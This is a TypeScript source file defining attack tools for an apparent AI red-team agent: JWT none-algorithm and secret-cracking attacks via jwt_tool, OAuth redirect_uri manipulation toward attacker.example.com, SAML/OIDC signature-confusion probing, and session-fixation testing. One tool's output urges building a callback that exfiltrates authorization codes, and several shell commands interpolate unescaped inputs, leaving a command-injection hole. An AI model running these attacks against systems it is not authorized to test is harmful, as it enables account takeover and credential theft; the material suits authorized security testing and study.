import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { kesExec } from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'
import { buildTargetUrl } from '../lib/port-protocol.js'

const logger = createLogger('red_team_agent')

export const jwtAttackTool = new FunctionTool({
  name: 'jwt_attack',
  description: `Attack a JSON Web Token: detect 'none' algorithm acceptance, weak HS256 secret crack, kid header injection, alg confusion (HS256→RS256 public key signing).
Wraps jwt_tool.`,
  parameters: z.object({
    token: z.string().describe('A captured JWT (header.payload.signature)'),
    targetUrl: z.string().optional().describe('A URL that accepts the JWT in Authorization header — used to test forged tokens'),
    wordlist: z.string().optional().describe('Wordlist for HS256 brute (default rockyou.txt)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ token, targetUrl, wordlist, campaignId }) => {
    const start = Date.now()
    const wl = wordlist ?? '/usr/share/wordlists/rockyou.txt'

    const out: Record<string, unknown> = {}

    const decoded = await kesExec(`jwt_tool ${token} 2>&1`, 15)
    out.decoded = decoded.stdout.slice(0, 2000)

    const noneAttack = await kesExec(`jwt_tool ${token} -X a 2>&1`, 15)
    out.noneAlg = noneAttack.stdout.slice(0, 1500)

    const crack = await kesExec(`jwt_tool ${token} -C -d ${wl} 2>&1 | head -200`, 120)
    out.hs256Crack = crack.stdout.slice(0, 2000)

    if (targetUrl) {
      const tamper = await kesExec(
        `jwt_tool ${token} -t "${targetUrl}" -rh "Authorization: Bearer JWT_TOKEN" -M at 2>&1 | head -200`,
        60,
      )
      out.activeTamper = tamper.stdout.slice(0, 2000)
    }

    const indicators = {
      noneAccepted: /none.*signature.*verified|alg=none.*success/i.test(String(out.noneAlg ?? '')),
      secretCracked: /CRACKED|Secret found/i.test(String(out.hs256Crack ?? '')),
    }

    await logger.audit('jwt_attack', { tokenPrefix: token.slice(0, 20) }, indicators, Date.now() - start, campaignId)
    return { ...out, indicators }
  },
})

export const oauthProbeTool = new FunctionTool({
  name: 'oauth_probe',
  description: `Probe an OAuth 2.0 / OIDC authorization endpoint for misconfigurations: open-redirect on redirect_uri, missing state CSRF protection, scope upgrade, response_type confusion.`,
  parameters: z.object({
    authorizeUrl: z.string().describe('OAuth authorize endpoint, e.g. https://idp/oauth/authorize'),
    clientId: z.string().describe('OAuth client_id'),
    legitimateRedirect: z.string().describe('A known-good redirect_uri for this client'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ authorizeUrl, clientId, legitimateRedirect, campaignId }) => {
    const start = Date.now()
    const tests: Array<{ name: string; redirect: string; status: string; finalUrl: string; suspicious: boolean }> = []

    const variants: Array<{ name: string; redirect: string }> = [
      { name: 'attacker_full', redirect: 'https://attacker.example.com/cb' },
      { name: 'subdomain_takeover', redirect: legitimateRedirect.replace(/^https?:\/\//, 'https://attacker.') },
      { name: 'path_traversal', redirect: legitimateRedirect + '/../attacker' },
      { name: 'fragment_injection', redirect: legitimateRedirect + '#@attacker.example.com' },
      { name: 'open_redirect', redirect: legitimateRedirect + '?next=https://attacker.example.com' },
      { name: 'data_uri', redirect: 'data:text/html,<script>fetch(location)</script>' },
    ]

    for (const v of variants) {
      const url = `${authorizeUrl}?client_id=${encodeURIComponent(clientId)}&response_type=code&redirect_uri=${encodeURIComponent(v.redirect)}&scope=openid&state=test`
      const r = await kesExec(
        `curl -s -o /dev/null -w "%{http_code}|%{redirect_url}|%{url_effective}" --max-time 8 -k "${url}"`,
        12,
      )
      const [status, redirectUrl, finalUrl] = r.stdout.split('|')
      const suspicious = status.startsWith('3') &&
        (redirectUrl?.includes('attacker.example.com') || finalUrl?.includes('attacker.example.com'))
      tests.push({ name: v.name, redirect: v.redirect, status, finalUrl: redirectUrl || finalUrl, suspicious })
    }

    const noState = await kesExec(
      `curl -s -o /dev/null -w "%{http_code}" --max-time 8 -k "${authorizeUrl}?client_id=${encodeURIComponent(clientId)}&response_type=code&redirect_uri=${encodeURIComponent(legitimateRedirect)}&scope=openid"`,
      10,
    )

    await logger.audit('oauth_probe', { authorizeUrl, clientId }, { suspiciousCount: tests.filter(t => t.suspicious).length }, Date.now() - start, campaignId)
    return {
      tests,
      stateRequired: !noState.stdout.startsWith('2') && !noState.stdout.startsWith('3'),
      hint: tests.some(t => t.suspicious)
        ? 'Redirect_uri validation likely bypassable. Build full PoC: stand up a callback that exfiltrates the code.'
        : 'Strict redirect_uri validation observed.',
    }
  },
})

export const ssoConfusionTool = new FunctionTool({
  name: 'sso_confusion',
  description: `Probe a SAML or OIDC service for issuer-confusion / signature-stripping attacks (XSW for SAML, none-alg for OIDC, kid manipulation).
For SAML, supply a captured assertion. For OIDC, supply the discovery URL.`,
  parameters: z.object({
    samlAssertion: z.string().optional().describe('Base64-encoded SAML response (if testing SAML)'),
    oidcDiscoveryUrl: z.string().optional().describe('OIDC .well-known/openid-configuration URL'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ samlAssertion, oidcDiscoveryUrl, campaignId }) => {
    const start = Date.now()
    const out: Record<string, unknown> = {}

    if (samlAssertion) {
      const decoded = await kesExec(
        `echo "${samlAssertion}" | base64 -d 2>&1 | head -200`,
        10,
      )
      out.samlDecoded = decoded.stdout.slice(0, 3000)

      const xswHints: string[] = []
      if (/Signature/i.test(decoded.stdout) && /Assertion/i.test(decoded.stdout)) {
        xswHints.push('Signature element present — try XSW1..XSW8 (signature wrap) by reordering Assertion vs Signature.')
      }
      if (/<saml:Issuer/i.test(decoded.stdout)) {
        xswHints.push('Issuer present — test issuer-substitution against trusting SP.')
      }
      out.samlAttacks = xswHints
    }

    if (oidcDiscoveryUrl) {
      const disc = await kesExec(`curl -s --max-time 8 -k "${oidcDiscoveryUrl}"`, 10)
      out.oidcConfig = disc.stdout.slice(0, 2500)
      try {
        const j = JSON.parse(disc.stdout) as { issuer?: string; jwks_uri?: string; id_token_signing_alg_values_supported?: string[] }
        out.oidcSummary = {
          issuer: j.issuer,
          jwksUri: j.jwks_uri,
          algs: j.id_token_signing_alg_values_supported,
          allowsNone: j.id_token_signing_alg_values_supported?.includes('none') ?? false,
        }
      } catch {
        out.oidcSummary = 'Discovery doc not parseable'
      }
    }

    await logger.audit('sso_confusion', { hasSaml: !!samlAssertion, hasOidc: !!oidcDiscoveryUrl }, {}, Date.now() - start, campaignId)
    return out
  },
})

export const sessionTestTool = new FunctionTool({
  name: 'session_test',
  description: `Test session handling: session fixation (does the session id rotate after login?), cookie scope (Secure/HttpOnly/SameSite), predictable session ids.`,
  parameters: z.object({
    target: z.string(),
    port: z.number(),
    nmapTags: z.array(z.string()).optional(),
    loginPath: z.string(),
    username: z.string(),
    password: z.string(),
    usernameField: z.string().optional(),
    passwordField: z.string().optional(),
    campaignId: z.string().optional(),
  }),
  execute: async ({ target, port, nmapTags, loginPath, username, password, usernameField, passwordField, campaignId }) => {
    const start = Date.now()
    const url = buildTargetUrl(target, port, nmapTags ?? [])
    const loginUrl = `${url}${loginPath}`
    const uf = usernameField ?? 'username'
    const pf = passwordField ?? 'password'

    const pre = await kesExec(`curl -s -i --max-time 8 -k -c /tmp/sess_pre.txt "${url}/" 2>&1 | grep -i "set-cookie:" | head -5`, 12)
    const preCookies = pre.stdout

    await kesExec(
      `curl -s --max-time 12 -k -b /tmp/sess_pre.txt -c /tmp/sess_post.txt -X POST -d "${uf}=${username}&${pf}=${password}" "${loginUrl}"`,
      18,
    )
    const postCookies = await kesExec(`cat /tmp/sess_post.txt 2>/dev/null`, 3)

    const findings: string[] = []

    const idsBefore = preCookies.match(/(PHPSESSID|JSESSIONID|sessionid|SESSION|sid|connect\.sid|csrftoken|laravel_session)=([A-Za-z0-9_\-]+)/gi) ?? []
    const idsAfter = postCookies.stdout.match(/(PHPSESSID|JSESSIONID|sessionid|SESSION|sid|connect\.sid|csrftoken|laravel_session)\s+[A-Za-z0-9_\-]+/gi) ?? []

    if (idsBefore && idsBefore.length > 0 && idsAfter && idsAfter.length > 0) {
      const beforeId = idsBefore[0]!.split('=')[1]
      const afterMatch = idsAfter[0]!.split(/\s+/)
      const afterId = afterMatch[afterMatch.length - 1]
      if (beforeId === afterId) {
        findings.push('SESSION FIXATION: session id did not rotate after successful login')
      }
    }

    if (!/Secure/i.test(postCookies.stdout)) findings.push('Session cookie missing Secure flag')
    if (!/HttpOnly/i.test(postCookies.stdout)) findings.push('Session cookie missing HttpOnly flag')
    if (!/SameSite/i.test(postCookies.stdout)) findings.push('Session cookie missing SameSite attribute')

    const sample = await Promise.all(
      Array.from({ length: 5 }).map(() =>
        kesExec(`curl -s -I --max-time 6 -k "${url}/" 2>&1 | grep -i "set-cookie:" | head -3`, 8),
      ),
    )
    const ids = sample
      .flatMap(r => (r.stdout.match(/(PHPSESSID|JSESSIONID|sessionid|SESSION|sid)=([A-Za-z0-9]{8,})/g) ?? []))
      .map(s => s.split('=')[1])
    if (ids.length >= 3) {
      const lengths = new Set(ids.map(i => i.length))
      const charsetSize = new Set(ids.join('').split('')).size
      if (lengths.size === 1 && charsetSize < 16) {
        findings.push(`Session id appears low-entropy (${charsetSize} unique chars)`)
      }
    }

    await logger.audit('session_test', { target, port }, { findingsCount: findings.length }, Date.now() - start, campaignId)
    return { url: loginUrl, findings, evidence: { pre: preCookies, post: postCookies.stdout.slice(0, 800) } }
  },
})
